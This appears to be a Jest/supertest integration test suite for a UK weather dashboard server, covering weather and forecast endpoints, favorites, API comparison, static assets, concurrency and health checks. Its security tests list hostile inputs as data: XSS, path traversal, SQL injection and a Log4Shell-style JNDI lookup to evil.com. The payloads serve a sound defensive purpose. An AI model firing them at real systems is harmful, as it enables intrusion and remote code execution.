const request = require('supertest');
const app = require('../server');

describe('Integration Tests', () => {
    describe('Weather Data Flow', () => {
        test('should complete full weather data retrieval flow', async () => {
            // Test the complete flow from API request to response
            const location = 'London';
            
            // 1. Check service status
            const statusResponse = await request(app)
                .get('/api/weather/status');
            
            expect(statusResponse.status).toBe(200);
            
            // 2. Get current weather
            const weatherResponse = await request(app)
                .get(`/api/weather/current/${location}`);
            
            if (weatherResponse.status === 200) {
                expect(weatherResponse.body.success).toBe(true);
                expect(weatherResponse.body.data.location.name).toBeDefined();
                expect(weatherResponse.body.data.current.temperature).toBeDefined();
                
                // 3. Get forecast
                const forecastResponse = await request(app)
                    .get(`/api/weather/forecast/${location}`);
                
                if (forecastResponse.status === 200) {
                    expect(forecastResponse.body.success).toBe(true);
                    expect(forecastResponse.body.data.forecast).toBeDefined();
                    expect(Array.isArray(forecastResponse.body.data.forecast)).toBe(true);
                }
                
                // 4. Add to favorites
                const favoriteResponse = await request(app)
                    .post(`/api/weather/favorites/${location}`)
                    .send({ displayName: 'London, UK' });
                
                expect(favoriteResponse.status).toBe(200);
                
                // 5. Verify in favorites list
                const favoritesListResponse = await request(app)
                    .get('/api/weather/favorites');
                
                expect(favoritesListResponse.status).toBe(200);
                expect(favoritesListResponse.body.favorites.some(fav => 
                    fav.location === location
                )).toBe(true);
                
                // 6. Remove from favorites
                const removeFavoriteResponse = await request(app)
                    .delete(`/api/weather/favorites/${location}`);
                
                expect(removeFavoriteResponse.status).toBe(200);
            } else {
                // Service might not be available, which is acceptable in test environment
                expect(weatherResponse.status).toBe(503);
            }
        });
    });

    describe('API Comparison Flow', () => {
        test('should complete API comparison workflow', async () => {
            const location = 'Manchester';
            
            // 1. Run comparison
            const comparisonResponse = await request(app)
                .get(`/api/comparison/current/${location}`);
            
            if (comparisonResponse.status === 200) {
                expect(comparisonResponse.body.success).toBe(true);
                expect(comparisonResponse.body.location).toBe(location);
                expect(comparisonResponse.body.results).toBeDefined();
                expect(comparisonResponse.body.sources).toBeDefined();
                
                // Should have attempted to get data from multiple sources
                expect(comparisonResponse.body.sources.total).toBeGreaterThan(1);
                
                // 2. Get accuracy history
                const accuracyResponse = await request(app)
                    .get('/api/comparison/accuracy?days=1');
                
                expect(accuracyResponse.status).toBe(200);
                expect(accuracyResponse.body.success).toBe(true);
            } else {
                // Services might not be available
                expect(comparisonResponse.status).toBe(503);
            }
        });
    });

    describe('Frontend Integration', () => {
        test('should serve frontend pages correctly', async () => {
            // Test main dashboard
            const dashboardResponse = await request(app).get('/');
            expect(dashboardResponse.status).toBe(200);
            expect(dashboardResponse.text).toContain('Weather Dashboard UK');
            
            // Test testing page
            const testingResponse = await request(app).get('/testing');
            expect(testingResponse.status).toBe(200);
            expect(testingResponse.text).toContain('API Testing Suite');
            
            // Test comparison page
            const comparisonResponse = await request(app).get('/comparison');
            expect(comparisonResponse.status).toBe(200);
            expect(comparisonResponse.text).toContain('API Comparison Analysis');
        });

        test('should serve static assets correctly', async () => {
            // Test CSS
            const cssResponse = await request(app).get('/css/dashboard.css');
            expect(cssResponse.status).toBe(200);
            expect(cssResponse.headers['content-type']).toContain('text/css');
            
            // Test JavaScript
            const jsResponse = await request(app).get('/js/dashboard.js');
            expect(jsResponse.status).toBe(200);
            expect(jsResponse.headers['content-type']).toContain('application/javascript');
        });
    });

    describe('Database Integration', () => {
        test('should handle database operations correctly', async () => {
            const testLocation = 'TestCity' + Date.now();
            
            // Add to favorites (database write)
            const addResponse = await request(app)
                .post(`/api/weather/favorites/${testLocation}`)
                .send({ displayName: 'Test City' });
            
            expect(addResponse.status).toBe(200);
            
            // Get favorites (database read)
            const getResponse = await request(app)
                .get('/api/weather/favorites');
            
            expect(getResponse.status).toBe(200);
            expect(getResponse.body.favorites.some(fav => 
                fav.location === testLocation
            )).toBe(true);
            
            // Remove from favorites (database delete)
            const removeResponse = await request(app)
                .delete(`/api/weather/favorites/${testLocation}`);
            
            expect(removeResponse.status).toBe(200);
            
            // Verify removal
            const verifyResponse = await request(app)
                .get('/api/weather/favorites');
            
            expect(verifyResponse.body.favorites.some(fav => 
                fav.location === testLocation
            )).toBe(false);
        });
    });
});

describe('Performance Integration Tests', () => {
    test('should handle concurrent requests efficiently', async () => {
        const location = 'Newcastle';
        const concurrentRequests = 10;
        
        const startTime = Date.now();
        
        const requests = Array(concurrentRequests).fill().map(() =>
            request(app).get(`/api/weather/current/${location}`)
        );
        
        const responses = await Promise.allSettled(requests);
        const endTime = Date.now();
        
        const totalTime = endTime - startTime;
        const successfulResponses = responses.filter(r => 
            r.status === 'fulfilled' && [200, 503].includes(r.value.status)
        );
        
        // Should handle most requests successfully or gracefully
        expect(successfulResponses.length).toBeGreaterThan(concurrentRequests * 0.5);
        
        // Should complete within reasonable time
        expect(totalTime).toBeLessThan(30000); // 30 seconds
    });
});

describe('Security Integration Tests', () => {
    test('should handle security headers correctly', async () => {
        const response = await request(app).get('/');
        
        // Check for security headers
        expect(response.headers).toHaveProperty('x-content-type-options');
        expect(response.headers).toHaveProperty('x-frame-options');
        expect(response.headers).toHaveProperty('x-xss-protection');
    });

    test('should handle malicious input safely', async () => {
        const maliciousInputs = [
            '<script>alert("xss")</script>',
            '../../etc/passwd',
            'DROP TABLE users;',
            '${jndi:ldap://evil.com/a}',
            'javascript:alert(1)'
        ];
        
        for (const input of maliciousInputs) {
            const response = await request(app)
                .get(`/api/weather/current/${encodeURIComponent(input)}`);
            
            // Should either reject with 400 or handle safely
            if (response.status === 200) {
                // If successful, response should not contain the malicious input
                expect(response.text).not.toContain('<script>');
                expect(response.text).not.toContain('javascript:');
            } else {
                expect([400, 404, 500].includes(response.status)).toBe(true);
            }
        }
    });
});

describe('Health Check Integration', () => {
    test('should provide detailed health information', async () => {
        const response = await request(app).get('/health');
        
        expect(response.status).toBe(200);
        expect(response.body).toHaveProperty('status');
        expect(response.body).toHaveProperty('timestamp');
        expect(response.body).toHaveProperty('uptime');
        expect(response.body).toHaveProperty('memory');
        expect(response.body).toHaveProperty('environment');
        
        // Uptime should be positive
        expect(response.body.uptime).toBeGreaterThan(0);
        
        // Memory usage should be reasonable
        expect(response.body.memory.heapUsed).toBeGreaterThan(0);
        expect(response.body.memory.heapTotal).toBeGreaterThan(response.body.memory.heapUsed);
    });
});